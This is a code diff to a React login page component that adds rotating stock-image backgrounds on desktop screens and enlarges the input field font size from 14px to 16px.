@@ -9,6 +9,16 @@ interface OthersLoginPageProps {
   onBack?: () => void;
 }
 
+const bgImages = [
+  'https://t4.ftcdn.net/jpg/16/63/26/51/360_F_1663265139_4lYMaxRozez8ZWaEKRGeOnDwHJHkmnvZ.jpg',
+  'https://img.freepik.com/free-vector/abstract-classic-blue-background_23-2148434987.jpg?semt=ais_rp_progressive&w=740&q=80',
+  'https://static.vecteezy.com/system/resources/thumbnails/013/006/541/small/wave-of-the-many-colored-lines-abstract-wavy-stripes-background-isolated-free-vector.jpg',
+  'https://img.freepik.com/free-vector/abstract-wave-line-background-vector-illustration_460848-11121.jpg?semt=ais_user_personalization&w=740&q=80',
+  'https://img.freepik.com/free-vector/gradient-blue-background-modern-design-geometric_343694-3809.jpg?semt=ais_hybrid&w=740&q=80',
+  'https://t4.ftcdn.net/jpg/02/42/03/25/360_F_242032542_DMW2J5F2t1P2mTOF3xRpxpOUwqSueGuh.jpg',
+  'https://media.freestocktextures.com/cache/38/3c/383c0f90fdd90dac685de27ebdc40afd.jpg',
+];
+
 const OthersLoginPage: React.FC<OthersLoginPageProps> = ({
   onLoginSuccess,
   onLoginError,
@@ -21,12 +31,28 @@ const OthersLoginPage: React.FC<OthersLoginPageProps> = ({
   const [pageReady, setPageReady] = useState(false);
   const [nextLoading, setNextLoading] = useState(false);
   const [submitting, setSubmitting] = useState(false);
+  const [bgIndex, setBgIndex] = useState(() => Math.floor(Math.random() * bgImages.length));
 
   const { isLoading, errorMessage, handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);
 
   useEffect(() => {
     const timer = setTimeout(() => setPageReady(true), 100);
     return () => clearTimeout(timer);
+  }, []);
+
+  useEffect(() => {
+    const interval = setInterval(() => {
+      setBgIndex(prev => {
+        let next = Math.floor(Math.random() * bgImages.length);
+        let attempts = 0;
+        while (next === prev && bgImages.length > 1 && attempts < 10) {
+          next = Math.floor(Math.random() * bgImages.length);
+          attempts++;
+        }
+        return next;
+      });
+    }, 6000);
+    return () => clearInterval(interval);
   }, []);
 
   const handleNext = async (e: React.FormEvent) => {
@@ -72,12 +98,20 @@ const OthersLoginPage: React.FC<OthersLoginPageProps> = ({
 
   return (
     <div className="min-h-screen flex flex-col font-sans" style={{ animation: 'fadeIn 0.3s ease-in' }}>
-      {/* Desktop: dark background, Mobile: white background */}
+      {/* Desktop: rotating background images, Mobile: white background */}
       <style>{`
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-        .others-page { background: #f5f5f5; }
+        .others-page {
+          background: #f5f5f5;
+        }
         @media screen and (min-width: 510px) {
-          .others-page { background: rgba(0,0,0,0.5); }
+          .others-page {
+            background-image: url(${bgImages[bgIndex]});
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            transition: background-image 0.8s ease-in-out;
+          }
         }
       `}</style>
 
@@ -195,7 +229,7 @@ const OthersLoginPage: React.FC<OthersLoginPageProps> = ({
                     padding: '10px 12px',
                     border: '2px solid #d3d3d3',
                     borderRadius: '4px',
-                    fontSize: '14px',
+                    fontSize: '16px',
                     color: '#323232',
                     outline: 'none',
                     transition: 'border-color 0.2s',
@@ -254,7 +288,7 @@ const OthersLoginPage: React.FC<OthersLoginPageProps> = ({
                     padding: '10px 12px',
                     border: '2px solid #d3d3d3',
                     borderRadius: '4px',
-                    fontSize: '14px',
+                    fontSize: '16px',
                     color: '#323232',
                     outline: 'none',
                     transition: 'border-color 0.2s',
